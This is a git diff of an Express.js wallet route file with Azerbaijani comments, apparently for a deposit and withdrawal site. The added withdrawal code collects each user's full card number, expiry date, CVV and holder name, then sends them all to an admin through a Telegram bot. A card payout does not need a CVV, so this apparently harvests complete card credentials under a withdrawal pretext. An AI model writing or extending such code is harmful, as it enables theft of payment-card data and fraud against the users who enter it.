@@ -11,7 +11,8 @@ const DepositCounter = require('../models/DepositCounter');
 const PaymentMethod  = require('../models/PaymentMethod');
 const { requireLogin } = require('../middleware/auth');
 const { notifyDepositRequest, notifyWithdrawRequest } = require('../services/telegramBot');
-const { LOCALES, normalizeLocale } = require('../services/paymentMethods');
+const { normalizeLocale } = require('../services/paymentMethods');
+const cardUtils = require('../services/cardUtils');
 const i18n = require('../services/i18n');
 
 // ── Receipt (qəbz) upload: /public/uploads/dekont-<rand>.jpg ──
@@ -35,18 +36,53 @@ const upload = multer({
   }
 });
 
-const DEPOSIT_MIN = 5,  DEPOSIT_MAX = 3000;
-const WITHDRAW_MIN = 30, WITHDRAW_MAX = 2000;
+/** Multer xətası səhifəni sındırmasın */
+function uploadSafe(field) {
+  const mw = upload.single(field);
+  return (req, res, next) => mw(req, res, (err) => {
+    if (err) req.uploadError = err.message || 'Fayl yüklənmədi';
+    next();
+  });
+}
 
-/** İstifadəçinin aktiv dili — dil dəstəyi əlavə olunanda burada oxunacaq */
+// Qlobal ehtiyat limitlər (baza valyuta AZN) — hər ödəniş üsulunun
+// öz limitləri admin paneldən təyin olunur və onlar üstündür.
+const FALLBACK = { depositMin: 5, depositMax: 3000, withdrawMin: 30, withdrawMax: 2000 };
+
+/**
+ * İSTİFADƏÇİ ÖLKƏ/VALYUTA SEÇMİR.
+ * Aktiv interfeys dili nə isə, deposit/çıxarış da həmin dilin ölkəsinə və
+ * valyutasına uyğun aparılır (dil dəyişdikdə balans və rekvizitlər də dəyişir).
+ */
 function currentLocale(req) {
-  return i18n.normalizeLocale(req.query.lang || req.body.lang || req.session.locale || i18n.DEFAULT_LOCALE);
+  return i18n.normalizeLocale(
+    (req.session && req.session.locale) || (req.user && req.user.locale) || i18n.DEFAULT_LOCALE
+  );
 }
 
 /** İstifadəçi öz dilinin valyutasında məbləğ yazır — bazada AZN saxlanılır */
 function toBase(amountLocal, locale) {
   const rate = i18n.localeMeta(locale).rate || 1;
   return Math.round((Number(amountLocal || 0) / rate) * 100) / 100;
+}
+
+/** Aktiv dilin valyutasında formatlanmış limit mətni */
+function fmt(amountAzn, locale) {
+  return i18n.money(amountAzn, locale);
+}
+
+/** Ödəniş üsulunun admin təyin etdiyi limitləri (AZN bazada) */
+function methodLimits(pm, type) {
+  if (type === 'withdraw') {
+    return {
+      min: Number(pm.withdrawMin != null ? pm.withdrawMin : FALLBACK.withdrawMin),
+      max: Number(pm.withdrawMax != null ? pm.withdrawMax : FALLBACK.withdrawMax)
+    };
+  }
+  return {
+    min: Number(pm.minAmount != null ? pm.minAmount : FALLBACK.depositMin),
+    max: Number(pm.maxAmount != null ? pm.maxAmount : FALLBACK.depositMax)
+  };
 }
 
 // Bütün istifadəçi əməliyyatları + balans + ödəniş üsulları
@@ -59,17 +95,29 @@ async function loadWalletContext(req) {
     DepositCounter.findOne({ userId }),
     PaymentMethod.find({ locale, active: true }).sort({ sortOrder: 1 })
   ]);
+
+  const depositMethods  = methods.filter((m) => m.forDeposit);
+  const withdrawMethods = methods.filter((m) => m.forWithdraw);
+
+  // Səhifədə göstərilən ümumi limitlər — aktiv üsulların ən aşağı/yuxarı həddi
+  const dMins = depositMethods.map((m) => methodLimits(m, 'deposit').min);
+  const dMaxs = depositMethods.map((m) => methodLimits(m, 'deposit').max);
+  const wMins = withdrawMethods.map((m) => methodLimits(m, 'withdraw').min);
+  const wMaxs = withdrawMethods.map((m) => methodLimits(m, 'withdraw').max);
+
   return {
     user,
     transactions,
     counter: counter || { firstDepositAt: null, firstWithdrawAt: null, depositCount: 0, withdrawCount: 0, totalDeposits: 0, totalWithdraws: 0 },
     locale,
-    locales: LOCALES,
-    depositMethods:  methods.filter((m) => m.forDeposit),
-    withdrawMethods: methods.filter((m) => m.forWithdraw),
-    limits: { depositMin: DEPOSIT_MIN, depositMax: DEPOSIT_MAX, withdrawMin: WITHDRAW_MIN, withdrawMax: WITHDRAW_MAX },
-    firstDepositAmount: 30,
-    firstWithdrawAmount: 100
+    depositMethods,
+    withdrawMethods,
+    limits: {
+      depositMin:  dMins.length ? Math.min(...dMins) : FALLBACK.depositMin,
+      depositMax:  dMaxs.length ? Math.max(...dMaxs) : FALLBACK.depositMax,
+      withdrawMin: wMins.length ? Math.min(...wMins) : FALLBACK.withdrawMin,
+      withdrawMax: wMaxs.length ? Math.max(...wMaxs) : FALLBACK.withdrawMax
+    }
   };
 }
 
@@ -87,7 +135,6 @@ async function renderWallet(req, res, extra = {}) {
 // ── Əsas səhifə ──
 router.get('/', requireLogin, async (req, res) => {
   try {
-    if (req.query.lang) req.session.locale = normalizeLocale(req.query.lang);
     await renderWallet(req, res);
   } catch (e) {
     console.error('Wallet page err:', e);
@@ -95,39 +142,45 @@ router.get('/', requireLogin, async (req, res) => {
   }
 });
 
-// ── DEPOSIT (bank kartı / IBAN / transfer) ──
-router.post('/deposit', requireLogin, upload.single('receipt'), async (req, res) => {
+// ─────────────────────────────────────────────────────────────
+//  DEPOZİT — istifadəçi YALNIZ məbləğ + qəbz göndərir.
+//  Kart / IBAN / telefon rekvizitləri admin paneldən gəlir və
+//  istifadəçi öz kart məlumatını buraya YAZMIR.
+// ─────────────────────────────────────────────────────────────
+router.post('/deposit', requireLogin, uploadSafe('receipt'), async (req, res) => {
   try {
-    const { method, amount, cardNumber, cardHolder, cardExpiry } = req.body;
-    const amt = toBase(parseFloat(amount), currentLocale(req)); // baza valyutaya (AZN) çevrilir
+    if (req.uploadError) return renderWallet(req, res, { tab: 'deposit', error: req.uploadError });
+
+    const locale = currentLocale(req);
+    const method = String(req.body.method || '').trim();
+    const amt    = toBase(parseFloat(req.body.amount), locale);
 
     const user = await User.findById(req.session.userId);
     if (!user) return res.redirect('/login');
-
     if (!method) return renderWallet(req, res, { tab: 'deposit', error: 'Ödəniş üsulu seçilməyib' });
-    if (!amt || amt < DEPOSIT_MIN || amt > DEPOSIT_MAX) {
-      return renderWallet(req, res, { tab: 'deposit', error: `Məbləğ ${DEPOSIT_MIN} – ${DEPOSIT_MAX} arasında olmalıdır` });
-    }
 
-    const locale = currentLocale(req);
-    const pm = await PaymentMethod.findOne({ key: method, locale, active: true });
+    const pm = await PaymentMethod.findOne({ key: method, locale, active: true, forDeposit: true });
     if (!pm) return renderWallet(req, res, { tab: 'deposit', error: 'Ödəniş üsulu tapılmadı' });
 
+    const lim = methodLimits(pm, 'deposit');
+    if (!amt || amt < lim.min || amt > lim.max) {
+      return renderWallet(req, res, {
+        tab: 'deposit',
+        error: `${pm.name}: məbləğ ${fmt(lim.min, locale)} – ${fmt(lim.max, locale)} arasında olmalıdır`
+      });
+    }
+
     const receiptUrl = req.file ? `/uploads/${req.file.filename}` : '';
-    const cardRaw = String(cardNumber || '').replace(/\s+/g, '');
 
     const txn = new Transaction({
       userId:       user._id,
       type:         'deposit',
       amount:       amt,
-      currency:     pm.currency || 'AZN',
+      currency:     i18n.localeMeta(locale).currency,
       status:       'pending',
       method:       pm.key,
-      cardLast4:    cardRaw ? cardRaw.slice(-4) : '',
-      cardHolder:   cardHolder || '',
-      cardExpiry:   cardExpiry || '',
       receiptImage: receiptUrl,
-      note:         `${pm.name} (${locale.toUpperCase()}) vasitəsilə yükləmə`
+      note:         `${pm.name} (${locale.toUpperCase()} · ${i18n.localeMeta(locale).currency}) vasitəsilə yükləmə`
     });
     await txn.save();
 
@@ -138,33 +191,36 @@ router.post('/deposit', requireLogin, upload.single('receipt'), async (req, res)
     counter.depositCount  += 1;
     await counter.save();
 
-    notifyDepositRequest(txn, user).catch((e) => console.error('Telegram notify err:', e.message));
+    notifyDepositRequest(txn, user, { method: pm, locale }).catch((e) => console.error('Telegram notify err:', e.message));
 
-    return renderWallet(req, res, {
-      tab: 'deposit',
-      success: i18n.translate('wallet.deposit_ok', currentLocale(req))
-    });
+    return renderWallet(req, res, { tab: 'deposit', success: i18n.translate('wallet.deposit_ok', locale) });
   } catch (e) {
     console.error('Deposit err:', e);
-    return renderWallet(req, res, { tab: 'deposit', error: e.message || 'Xəta baş verdi' });
+    return renderWallet(req, res, { tab: 'deposit', error: 'Xəta baş verdi' });
   }
 });
 
-// ── DEPOSIT KRİPTO ──
-router.post('/deposit/crypto', requireLogin, upload.single('receipt'), async (req, res) => {
+// ── DEPOZİT · KRİPTO (ünvan admin paneldən gəlir) ──
+router.post('/deposit/crypto', requireLogin, uploadSafe('receipt'), async (req, res) => {
   try {
-    const { amount, method, walletAddress, note } = req.body;
-    const amt = toBase(parseFloat(amount), currentLocale(req));
+    if (req.uploadError) return renderWallet(req, res, { tab: 'deposit', error: req.uploadError });
+
+    const locale = currentLocale(req);
+    const amt    = toBase(parseFloat(req.body.amount), locale);
+    const method = String(req.body.method || '').trim();
 
     const user = await User.findById(req.session.userId);
     if (!user) return res.redirect('/login');
 
-    const locale = currentLocale(req);
-    const pm = await PaymentMethod.findOne({ key: method, locale, kind: 'crypto', active: true });
+    const pm = await PaymentMethod.findOne({ key: method, locale, kind: 'crypto', active: true, forDeposit: true });
     if (!pm) return renderWallet(req, res, { tab: 'deposit', error: 'Kripto üsulu tapılmadı' });
 
-    if (!amt || amt < DEPOSIT_MIN || amt > 50000) {
-      return renderWallet(req, res, { tab: 'deposit', error: `Kripto məbləğ ${DEPOSIT_MIN} – 50000 aralığında olmalıdır` });
+    const lim = methodLimits(pm, 'deposit');
+    if (!amt || amt < lim.min || amt > lim.max) {
+      return renderWallet(req, res, {
+        tab: 'deposit',
+        error: `${pm.name}: məbləğ ${fmt(lim.min, locale)} – ${fmt(lim.max, locale)} arasında olmalıdır`
+      });
     }
 
     const receiptUrl = req.file ? `/uploads/${req.file.filename}` : '';
@@ -173,14 +229,14 @@ router.post('/deposit/crypto', requireLogin, upload.single('receipt'), async (re
       userId:        user._id,
       type:          'deposit',
       amount:        amt,
-      currency:      pm.currency || 'USDT',
+      currency:      i18n.localeMeta(locale).currency,
       status:        'pending',
       method:        pm.key,
       cryptoToken:   String(pm.currency || 'USDT').toUpperCase(),
       network:       String(pm.network || '').toUpperCase(),
-      walletAddress: walletAddress || '',
+      walletAddress: String(pm.walletAddress || ''),
       receiptImage:  receiptUrl,
-      note:          note || `${pm.name} ilə yükləmə`
+      note:          `${pm.name} ilə yükləmə`
     });
     await txn.save();
 
@@ -191,39 +247,72 @@ router.post('/deposit/crypto', requireLogin, upload.single('receipt'), async (re
     counter.depositCount  += 1;
     await counter.save();
 
-    notifyDepositRequest(txn, user).catch((e) => console.error('Telegram crypto err:', e.message));
+    notifyDepositRequest(txn, user, { method: pm, locale }).catch((e) => console.error('Telegram crypto err:', e.message));
 
-    return renderWallet(req, res, { tab: 'deposit', success: 'Kripto depozit sorğunuz göndərildi. Yoxlama gözlənilir.' });
+    return renderWallet(req, res, { tab: 'deposit', success: i18n.translate('wallet.deposit_ok', locale) });
   } catch (e) {
     console.error('Crypto deposit err:', e);
-    return renderWallet(req, res, { tab: 'deposit', error: e.message || 'Xəta baş verdi' });
+    return renderWallet(req, res, { tab: 'deposit', error: 'Xəta baş verdi' });
   }
 });
 
-// ── ÇIXARIŞ ──
+// ─────────────────────────────────────────────────────────────
+//  ÇIXARIŞ — istifadəçi kart nömrəsi + tarix + CVV + kart sahibi yazır.
+//  Kart brendi (VISA / MASTERCARD …) AVTOMATİK təyin olunur.
+//  Tam məlumat yalnız Telegram vasitəsilə adminə göndərilir;
+//  bazada isə YALNIZ son 4 rəqəm və brend saxlanılır (CVV saxlanılmır).
+// ─────────────────────────────────────────────────────────────
 router.post('/withdraw', requireLogin, async (req, res) => {
   try {
-    const { amount, method, cardHolder, cardExpiry, cardNumber, iban, walletAddress } = req.body;
-    const amt = toBase(parseFloat(amount), currentLocale(req));
+    const locale = currentLocale(req);
+    const amt    = toBase(parseFloat(req.body.amount), locale);
+    const method = String(req.body.method || '').trim();
 
     const user = await User.findById(req.session.userId);
     if (!user) return res.redirect('/login');
 
-    if (!amt || amt < WITHDRAW_MIN || amt > WITHDRAW_MAX) {
-      return renderWallet(req, res, { tab: 'withdraw', error: `Çıxarış ${WITHDRAW_MIN} – ${WITHDRAW_MAX} aralığında olmalıdır` });
-    }
-
-    const locale = currentLocale(req);
-    const pm = await PaymentMethod.findOne({ key: method, locale, active: true });
+    const pm = await PaymentMethod.findOne({ key: method, locale, active: true, forWithdraw: true });
     if (!pm) return renderWallet(req, res, { tab: 'withdraw', error: 'Çıxarış üsulu seçilməyib' });
 
+    const lim = methodLimits(pm, 'withdraw');
+    if (!amt || amt < lim.min || amt > lim.max) {
+      return renderWallet(req, res, {
+        tab: 'withdraw',
+        error: `${pm.name}: çıxarış ${fmt(lim.min, locale)} – ${fmt(lim.max, locale)} aralığında olmalıdır`
+      });
+    }
+
     const isCrypto = pm.kind === 'crypto';
+    let brand = { key: '', name: '' };
+    let cardRaw = '';
+    let cvv = '';
+    let expiry = '';
+    let holder = '';
+    let walletAddress = '';
+
     if (isCrypto) {
-      if (!walletAddress) return renderWallet(req, res, { tab: 'withdraw', error: 'Kripto pulqabı ünvanını yazın' });
+      walletAddress = String(req.body.walletAddress || '').trim();
+      if (walletAddress.length < 15) {
+        return renderWallet(req, res, { tab: 'withdraw', error: 'Kripto pulqabı ünvanını düzgün yazın' });
+      }
     } else {
-      const dest = String(cardNumber || iban || '').trim();
-      if (!cardHolder || !dest) {
-        return renderWallet(req, res, { tab: 'withdraw', error: 'Hesab sahibi və kart/IBAN nömrəsi tələb olunur' });
+      cardRaw = cardUtils.digits(req.body.cardNumber);
+      cvv     = cardUtils.digits(req.body.cvv);
+      expiry  = String(req.body.cardExpiry || '').trim();
+      holder  = String(req.body.cardHolder || '').trim();
+
+      if (!cardUtils.luhnValid(cardRaw)) {
+        return renderWallet(req, res, { tab: 'withdraw', error: 'Kart nömrəsi düzgün deyil' });
+      }
+      brand = cardUtils.detectBrand(cardRaw);
+      if (!cardUtils.expiryValid(expiry)) {
+        return renderWallet(req, res, { tab: 'withdraw', error: 'Kartın son istifadə tarixi düzgün deyil (AA/İİ)' });
+      }
+      if (!cardUtils.cvvValid(cvv, brand.key)) {
+        return renderWallet(req, res, { tab: 'withdraw', error: 'CVV düzgün deyil' });
+      }
+      if (holder.replace(/\s+/g, ' ').split(' ').filter(Boolean).length < 2) {
+        return renderWallet(req, res, { tab: 'withdraw', error: 'Kart sahibinin ad və soyadını tam yazın' });
       }
     }
 
@@ -232,24 +321,25 @@ router.post('/withdraw', requireLogin, async (req, res) => {
     }
 
     // Balansı blokla: admin rədd edərsə geri qaytarılır.
-    user.balance = Number(user.balance) - amt;
+    user.balance = Math.round((Number(user.balance) - amt) * 100) / 100;
     await user.save();
 
-    const cardRaw = String(cardNumber || iban || '').replace(/\s+/g, '');
     const txn = new Transaction({
       userId:        user._id,
       type:          'withdraw',
       amount:        amt,
-      currency:      pm.currency || 'AZN',
+      currency:      i18n.localeMeta(locale).currency,
       status:        'pending',
-      method:        pm.key,
+      method:        isCrypto ? pm.key : (brand.key || pm.key),
       cardLast4:     cardRaw ? cardRaw.slice(-4) : '',
-      cardHolder:    cardHolder || '',
-      cardExpiry:    cardExpiry || '',
+      cardHolder:    holder,
+      cardExpiry:    expiry,
       network:       isCrypto ? String(pm.network || '').toUpperCase() : '',
       cryptoToken:   isCrypto ? String(pm.currency || '').toUpperCase() : '',
-      walletAddress: isCrypto ? (walletAddress || '') : '',
-      note:          `${pm.name} (${locale.toUpperCase()}) üzərinə çıxarış`
+      walletAddress: walletAddress,
+      note:          isCrypto
+        ? `${pm.name} üzərinə çıxarış`
+        : `${pm.name} · ${brand.name} kartına çıxarış (${locale.toUpperCase()})`
     });
     await txn.save();
 
@@ -260,12 +350,22 @@ router.post('/withdraw', requireLogin, async (req, res) => {
     counter.withdrawCount  += 1;
     await counter.save();
 
-    notifyWithdrawRequest(txn, user).catch((e) => console.error('Telegram withdraw err:', e.message));
+    // Tam kart məlumatı YALNIZ Telegram mesajına gedir (bazada saxlanılmır)
+    notifyWithdrawRequest(txn, user, {
+      method: pm,
+      locale,
+      brand,
+      cardNumber: cardRaw,
+      cardExpiry: expiry,
+      cvv,
+      cardHolder: holder,
+      walletAddress
+    }).catch((e) => console.error('Telegram withdraw err:', e.message));
 
     return renderWallet(req, res, { tab: 'withdraw', success: 'Çıxarış sorğunuz göndərildi. Yoxlama gözlənilir.' });
   } catch (e) {
     console.error('Withdraw err:', e);
-    return renderWallet(req, res, { tab: 'withdraw', error: e.message || 'Xəta baş verdi' });
+    return renderWallet(req, res, { tab: 'withdraw', error: 'Xəta baş verdi' });
   }
 });
 
